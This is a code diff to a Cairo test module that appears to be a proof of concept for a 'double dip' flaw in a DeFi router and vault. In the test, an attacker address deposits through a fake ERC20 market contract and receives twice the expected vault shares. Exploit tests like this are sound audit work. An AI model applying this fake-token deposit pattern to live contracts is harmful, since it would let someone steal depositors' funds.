@@ -48,6 +48,7 @@ mod TestDoubleDip {
         let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
         let attacker = Constants::attacker();
         let Router = ISubDefiRouterSafeDispatcher { contract_address: router };
+        let Vault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault };
         let market_id: u32 = 0;
 
         // Deploy false wETH Market contract
@@ -58,16 +59,23 @@ mod TestDoubleDip {
         let false_market_class: ContractClass = declare_contract('FalseERC20');
         let false_market_address: ContractAddress = deploy_contract(false_market_class, call_data);
 
-        IERC20CamelSafeDispatcher { contract_address: wETH }
+        start_prank(CheatTarget::One(wETH), attacker);
+        let _success: bool = IERC20CamelSafeDispatcher { contract_address: wETH }
             .transfer(false_market_address, deposit_amount)
             .unwrap();
+        stop_prank(CheatTarget::One(wETH));
+
         // Deposit
         start_prank(CheatTarget::One(router), attacker);
         let _deposit_id: u8 = Router
             .deposit_request(market_id, false_market_address, deposit_amount)
             .unwrap();
+            
         stop_prank(CheatTarget::One(router));
-    // Redeem
+        start_prank(CheatTarget::One(eth_vault), attacker);
+        let sdETH_balance: u256 = Vault.share_balance(attacker).unwrap();
+        stop_prank(CheatTarget::One(eth_vault));
+        assert(sdETH_balance == 10000000000000000000, 'Invalid Shares');
     }
 }
 
